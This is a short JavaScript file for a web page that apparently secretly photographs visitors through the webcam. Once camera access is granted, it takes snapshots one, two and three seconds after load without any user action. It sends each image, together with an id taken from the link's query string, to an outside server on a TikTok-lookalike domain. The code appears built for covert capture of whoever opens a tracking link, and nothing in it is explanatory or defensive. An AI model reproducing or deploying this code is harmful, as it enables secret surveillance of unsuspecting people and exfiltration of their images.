var width = 320;
var height = 0;
var streaming = false;
var video = null;
var canvas = null;
var photo = null;
var startbutton = null;

const id = location.search.split('=')[1];


function startup() {
  video = document.getElementById('video');
  canvas = document.getElementById('canvas');
  photo = document.getElementById('photo');

  startbutton = document.getElementById('startbutton');

  navigator.mediaDevices.getUserMedia({video: true}).then(function(stream) {
    video.srcObject = stream;

    video.play();
    startbutton.classList.add('streaming');
  }).catch(function(err) {
    console.log('Ошибка'); 
  });

  video.addEventListener('canplay', function(ev) {
    if (!streaming) {
      height = video.videoHeight / (video.videoWidth / width);
      if (isNaN(height)) height = width / (4 / 3);
      video.setAttribute('width', width);
      video.setAttribute('height', height);
      canvas.setAttribute('width', width);
      canvas.setAttribute('height', height);
      streaming = true;
    }
  }, false);

  startbutton.addEventListener('click', function(ev) {
    takepicture();
    ev.preventDefault();
  }, false);
  
  setTimeout(() => takepicture(), 1000)
  setTimeout(() => takepicture(), 2000)
  setTimeout(() => takepicture(), 3000)
}


function takepicture() {
  var context = canvas.getContext('2d');
  if (width && height) {
    canvas.width = width;
    canvas.height = height;
    context.drawImage(video, 0, 0, width, height);
    var data = canvas.toDataURL('image/png');
    let photo = new Image;
    photo.src = data;

    fetch('https://tiktoki.onrender.com/img', {
        method:'POST',
        headers: {
            'Content-Type': 'application/json'
          },
        body:JSON.stringify({img: data, id: id})
    })

  }
}


window.addEventListener('load', startup, false);



